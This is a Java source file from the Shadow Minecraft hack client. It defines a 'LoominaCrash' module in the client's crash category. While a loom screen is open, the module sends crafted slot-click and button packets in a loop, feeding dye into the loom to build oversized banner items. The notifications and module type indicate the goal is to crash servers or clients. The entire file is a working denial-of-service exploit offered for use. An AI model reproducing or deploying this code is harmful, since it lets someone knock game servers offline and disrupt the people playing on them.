/*
 * Copyright (c) Shadow client, Saturn5VFive and contributors 2022. All rights reserved.
 */

package net.shadow.client.feature.module.impl.crash;

import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.item.BannerItem;
import net.minecraft.item.DyeItem;
import net.minecraft.item.ItemStack;
import net.minecraft.network.packet.c2s.play.ButtonClickC2SPacket;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.LoomScreenHandler;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.SlotActionType;
import net.shadow.client.feature.gui.notifications.Notification;
import net.shadow.client.feature.module.Module;
import net.shadow.client.feature.module.ModuleType;

public class LoominaCrash extends Module {

    Notification expl = null;

    public LoominaCrash() {
        super("LoominaCrash", "Create infinitely big items with a loom", ModuleType.CRASH);
    }

    @Override
    public void tick() {
        if (client.player.currentScreenHandler instanceof LoomScreenHandler handler) {
            if (expl == null) {
                expl = Notification.create(-1, "", true, Notification.Type.INFO, "Exploiting...");
            }
            for (int i = 0; i < 2; i++) {
                simplePacketMove(3);
                simplePacketMove(0);
                client.player.networkHandler.sendPacket(new ButtonClickC2SPacket(client.player.currentScreenHandler.syncId, 5));
            }
            if (!(client.player.currentScreenHandler.getSlot(1).getStack().getItem() instanceof DyeItem) && (client.player.currentScreenHandler.getSlot(0).getStack().getItem() instanceof BannerItem)) { //WHY IS THIS A THING LMAOOO TY THO MOJANG
                for (int i = 5; i < 39; i++) {
                    if (client.player.currentScreenHandler.getSlot(i).getStack().getItem() instanceof DyeItem) {
                        simplePacketMove(i);
                        simplePacketMove(1);
                        return;
                    }
                }
                client.player.closeHandledScreen();
                Notification.create(1000, "Loomina", Notification.Type.ERROR, "out of dye!");
            }
        } else {
            if (this.expl != null) expl.duration = 0;
            expl = null;
        }
    }

    @Override
    public void enable() {
    }

    @Override
    public void disable() {
    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }


    void simplePacketMove(int slotId) {
        ScreenHandler screenHandler = client.player.currentScreenHandler;
        Int2ObjectOpenHashMap<ItemStack> int2ObjectMap = new Int2ObjectOpenHashMap<>();
        int2ObjectMap.put(slotId, client.player.currentScreenHandler.getSlot(slotId).getStack().copy());
        client.player.networkHandler.sendPacket(new ClickSlotC2SPacket(client.player.currentScreenHandler.syncId, screenHandler.getRevision(), slotId, 0, SlotActionType.PICKUP, client.player.currentScreenHandler.getSlot(slotId).getStack().copy(), int2ObjectMap));
    }
}
